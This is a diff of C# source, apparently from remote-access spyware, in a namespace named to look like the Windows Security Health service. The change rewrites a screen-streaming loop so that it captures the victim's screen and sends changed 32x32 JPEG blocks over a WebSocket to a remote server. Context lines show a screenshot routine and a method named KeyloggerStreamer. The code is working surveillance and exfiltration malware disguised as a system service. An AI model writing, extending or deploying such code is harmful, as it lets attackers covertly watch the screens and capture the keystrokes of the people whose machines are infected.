@@ -146,6 +146,7 @@ using System.IO;
 using System.Net;
 using System.Text;
 using System.Linq;
+using System.Net.WebSockets;
 using System.Threading;
 using System.Collections.Generic;
 using System.Collections.Concurrent;
@@ -720,27 +721,68 @@ namespace WinSecHealthSvc
             } catch (Exception ex) { return "screenshot error: " + ex.Message; }
         }
 
-        static void ScreenStreamLoop() {
-            var ep = new System.Drawing.Imaging.EncoderParameters(1);
-            ep.Param[0] = new System.Drawing.Imaging.EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 75L);
-            var jc = System.Drawing.Imaging.ImageCodecInfo.GetImageEncoders().First(c => c.FormatID == System.Drawing.Imaging.ImageFormat.Jpeg.Guid);
-            while (_screenStreaming) {
+        static async void ScreenStreamLoop() {
+            var ws = new ClientWebSocket();
+            try {
+                string wsUrl = _server.Replace("http", "ws") + "/api/agent/stream_ws?id=" + _clientId;
+                await ws.ConnectAsync(new Uri(wsUrl), CancellationToken.None);
+            } catch { return; }
+
+            var ep = new EncoderParameters(1);
+            ep.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 65L);
+            var jc = ImageCodecInfo.GetImageEncoders().First(c => c.FormatID == ImageFormat.Jpeg.Guid);
+            
+            int grid = 32;
+            var bounds = Screen.PrimaryScreen.Bounds;
+            Dictionary<int, long> hashes = new Dictionary<int, long>();
+
+            while (_screenStreaming && ws.State == WebSocketState.Open) {
                 try {
-                    var b = Screen.PrimaryScreen.Bounds;
-                    using (var fullBmp = new Bitmap(b.Width, b.Height)) {
-                        using (var gFull = Graphics.FromImage(fullBmp)) gFull.CopyFromScreen(b.X, b.Y, 0, 0, b.Size);
-                        using (var bmp = new Bitmap(fullBmp, new Size(b.Width / 2, b.Height / 2))) {
-                            using (var ms = new System.IO.MemoryStream()) {
-                                bmp.Save(ms, jc, ep);
-                                string b64 = Convert.ToBase64String(ms.ToArray());
-                                string json = "{\"id\":\"" + Esc(_clientId) + "\",\"frame\":\"" + b64 + "\"}";
-                                Task.Run(() => Post(_server + "/api/agent/stream_frame", json));
+                    using (var fullBmp = new Bitmap(bounds.Width, bounds.Height)) {
+                        using (var g = Graphics.FromImage(fullBmp)) g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);
+                        
+                        // Divide into 32x32 blocks
+                        for (int y = 0; y < bounds.Height; y += grid) {
+                            for (int x = 0; x < bounds.Width; x += grid) {
+                                int w = Math.Min(grid, bounds.Width - x);
+                                int h = Math.Min(grid, bounds.Height - y);
+                                int blockId = (y / grid) * 1000 + (x / grid);
+
+                                using (var block = fullBmp.Clone(new Rectangle(x, y, w, h), fullBmp.PixelFormat)) {
+                                    // Simple hash
+                                    long hash = 0;
+                                    var bd = block.LockBits(new Rectangle(0,0,w,h), ImageLockMode.ReadOnly, PixelFormat.Format32bppArgb);
+                                    unsafe {
+                                        byte* p = (byte*)bd.Scan0;
+                                        for(int i=0; i<w*h*4; i+=16) hash += p[i]; 
+                                    }
+                                    block.UnlockBits(bd);
+
+                                    if (!hashes.ContainsKey(blockId) || hashes[blockId] != hash) {
+                                        hashes[blockId] = hash;
+                                        using (var ms = new MemoryStream()) {
+                                            block.Save(ms, jc, ep);
+                                            byte[] jpeg = ms.ToArray();
+                                            // Header: [Type:1][X:2][Y:2][W:2][H:2][Len:4] = 11 bytes
+                                            byte[] pkt = new byte[11 + jpeg.Length];
+                                            pkt[0] = 0x02; // Delta
+                                            BitConverter.GetBytes((ushort)x).CopyTo(pkt, 1);
+                                            BitConverter.GetBytes((ushort)y).CopyTo(pkt, 3);
+                                            BitConverter.GetBytes((ushort)w).CopyTo(pkt, 5);
+                                            BitConverter.GetBytes((ushort)h).CopyTo(pkt, 7);
+                                            BitConverter.GetBytes(jpeg.Length).CopyTo(pkt, 9);
+                                            Buffer.BlockCopy(jpeg, 0, pkt, 11, jpeg.Length);
+                                            await ws.SendAsync(new ArraySegment<byte>(pkt), WebSocketMessageType.Binary, true, CancellationToken.None);
+                                        }
+                                    }
+                                }
                             }
                         }
                     }
                 } catch {}
-                Thread.Sleep(100);
+                await Task.Delay(100);
             }
+            try { await ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "", CancellationToken.None); } catch {}
         }
 
         static void KeyloggerStreamer() {
